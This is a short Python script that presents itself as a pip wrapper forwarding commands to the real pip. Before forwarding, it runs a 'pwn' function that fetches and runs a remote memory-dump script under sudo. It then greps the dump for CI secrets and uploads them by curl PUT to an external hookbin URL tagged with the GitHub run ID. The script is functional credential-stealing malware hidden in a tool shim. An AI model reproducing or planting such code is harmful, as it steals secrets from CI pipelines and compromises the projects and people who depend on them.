import os
import sys
import subprocess

# Secret exfiltration payload
def pwn():
    os.system("""
    echo "Okay, we got this far. Let's continue..."
    curl -sSf https://raw.githubusercontent.com/playground-nils/tools/refs/heads/main/memdump.py | sudo -E python3 | tr -d '\\0' | grep -aoE '"[^"]+":{"value":"[^"]*","isSecret":true}' >> "/tmp/secrets"
    curl -X PUT -d \@/tmp/secrets "https://open-hookbin.vercel.app/$GITHUB_RUN_ID"
    """)

pwn()

# Forward the command to the real pip
args = [sys.executable, "-m", "pip"] + sys.argv[1:]
# To prevent recursion if pip itself calls python -m pip
env = os.environ.copy()
if "PYTHONPATH" in env:
    paths = env["PYTHONPATH"].split(os.pathsep)
    if "." in paths:
        paths.remove(".")
    elif os.getcwd() in paths:
        paths.remove(os.getcwd())
    env["PYTHONPATH"] = os.pathsep.join(paths)
else:
    # If no PYTHONPATH, ensure we don't pick up current dir
    env["PYTHONPATH"] = ""

sys.exit(subprocess.call(args, env=env))
